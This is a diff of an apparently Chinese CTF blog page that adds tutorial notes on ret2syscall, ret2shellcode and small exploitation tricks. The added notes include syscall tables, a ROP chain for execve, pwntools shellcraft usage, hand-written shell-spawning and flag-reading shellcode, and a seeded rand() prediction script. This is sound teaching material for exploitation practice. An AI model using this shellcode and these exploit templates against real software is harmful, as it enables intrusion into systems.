@@ -385,14 +385,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.2k
+                    5.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    17 分
+                    21 分
                 </div>
                 
 
@@ -834,6 +834,89 @@ p <span class="token operator">+=</span> p64<span class="token punctuation">(</s
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x64</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p><a href="https://starrysky1004.github.io/ret2libc.zip">https://starrysky1004.github.io/ret2libc.zip</a></p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在题目没有给<code>libc</code>的情况下可以通过泄露多个已知函数名的地址，在<a target="_blank" rel="noopener" href="https://libc.rip/%E4%B8%AD%E6%9F%A5%E8%AF%A2">https://libc.rip/中查询</a></p>
+<h2 id="4-ret2syscall-amp-ret2shellcode-amp-零碎知识点"><a href="#4-ret2syscall-amp-ret2shellcode-amp-零碎知识点" class="headerlink" title="4.ret2syscall&amp;ret2shellcode&amp;零碎知识点"></a>4.ret2syscall&amp;ret2shellcode&amp;零碎知识点</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="前置基础-2"><a href="#前置基础-2" class="headerlink" title="前置基础"></a>前置基础</h4><p>操作系统的进程空间分为用户空间和内核空间，内核空间需要更高的权限，系统调用就是运行在用户空间的程序向操作系统内核请求需要更高权限运行的<strong>内核函数</strong></p>
+<p>当用户态进程发起一个系统调用，<code>CPU</code>切换到内核态并开始执行一个内核函数。由于系统调用处理函数只有一个，所以需要通过<code>rax</code>传递系统调用号确定调用的函数</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>应用程序在用户态准备好调用参数（包括系统调用号和函数参数），在<code>64</code>位程序中执行<code>syscall</code>或在<code>32</code>位程序中执行<code>int 80</code>触发软中断，<code>CPU</code>被软中断打断后执行对应中断处理函数，最后执行<code>ret</code>指令切换回用户态</p>
+<p>常用系统调用号：</p>
+<p><code>32</code>位  <code>read 3 		 open 5		write 4 	 sigreturn 77/0x4D		execve 11/0xb</code></p>
+<p><code>64</code>位  <code>read 0 	     open 2		write 1 	 sigreturn 15/0xF   execve 59/0x3b</code></p>
+<p><code>execve</code>用法：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>全部系统调用号参考：<a target="_blank" rel="noopener" href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">https://syscalls.mebeim.net/?table=x86/64/x64/latest</a></p>
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><h4 id="前置基础-3"><a href="#前置基础-3" class="headerlink" title="前置基础"></a>前置基础</h4><p>控制程序执行<code>shellcode</code>代码，<code>shellcode</code>指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的<code>shell</code>，或者<code>open read write</code>获取并输出<code>flag</code>，通常情况下<code>shellcode</code>需要我们自行编写，即向内存中填充一些可执行的代码</p>
+<p>前提条件：<code>shellcode</code>所在的区域具有可执行权限</p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>查看禁用的函数<code>seccomp-tools dump ./pwn</code></p>
+<p><code>exp</code>中<code>pwntools</code>使用：</p>
+<ul>
+<li><p>使用<code>asm()</code>将汇编代码转换为对应的机器码</p>
+</li>
+<li><p>生成<code>shell</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>生成<code>orw</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>	<span class="token comment">#'rsp'</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>自己写<code>shellcode</code></p>
+<ul>
+<li><p>执行<code>execve(&#39;/bin/sh&#39;, 0, 0)</code></p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">shellcode &#x3D; &#39;&#39;&#39;
+xor rdx,rdx
+push rdx
+mov rsi,rsp
+mov rax,0x68732f2f6e69622f
+push rax
+mov rdi,rsp
+mov rax,59
+syscall
+&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>执行<code>open read write</code></p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">shellcode &#x3D; &quot;&quot;&quot;
+push 0x67616c66
+mov rdi,rsp
+xor esi,esi
+push 2
+pop rax
+syscall
+mov rdi,rax
+mov rsi,rsp
+mov edx,0x100
+xor eax,eax
+syscall
+mov edi,1
+mov rsi,rsp
+push 1
+pop rax
+syscall
+&quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+</ul>
+<p>在线汇编和反汇编：<a target="_blank" rel="noopener" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">http://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></p>
+<h4 id="常见情况"><a href="#常见情况" class="headerlink" title="常见情况"></a>常见情况</h4><ul>
+<li>没有开启<code>NX</code>保护，可以泄露栈地址向栈中写入<code>shellcode</code>再将返回地址改到该地址</li>
+<li>程序使用<code>mprotect</code>函数给某一段可读可写可执行权限，并且让用户向这一段的变量中输入，再直接将输入的变量作为函数调用</li>
+</ul>
+<h3 id="零碎知识点"><a href="#零碎知识点" class="headerlink" title="零碎知识点"></a>零碎知识点</h3><p>整数溢出：变量定义为整型但输入后<code>(unsigned int)</code>强制转化为无符号整型，输入<code>-1</code>则变成正无穷</p>
+<p>字符溢出：<code>char</code>类型范围是<code>-128~+127</code>，因此输入超过<code>128</code>会变成负数</p>
+<p>数组越界：<code>index</code>可控的时候越界写到其他变量</p>
+<p><code>str</code>类函数：例如<code>strcpy</code>、<code>strcat</code>、<code>strcmp</code>、<code>strlen</code>等函数会被<code>\x00</code>截断</p>
+<p><code>scanf</code>：输入<code>+</code>或<code>-</code>不会有实际输入</p>
+<p>随机数绕过：利用<code>c</code>和<code>python</code>联合编程，例如：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>
+
+seed <span class="token operator">=</span> <span class="token number">0</span>
+libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
+    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -1135,7 +1218,7 @@ p <span class="token operator">+=</span> p64<span class="token punctuation">(</s
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">156.7k</span>&nbsp;字
+                class="white-color">157.6k</span>&nbsp;字
             
             
             
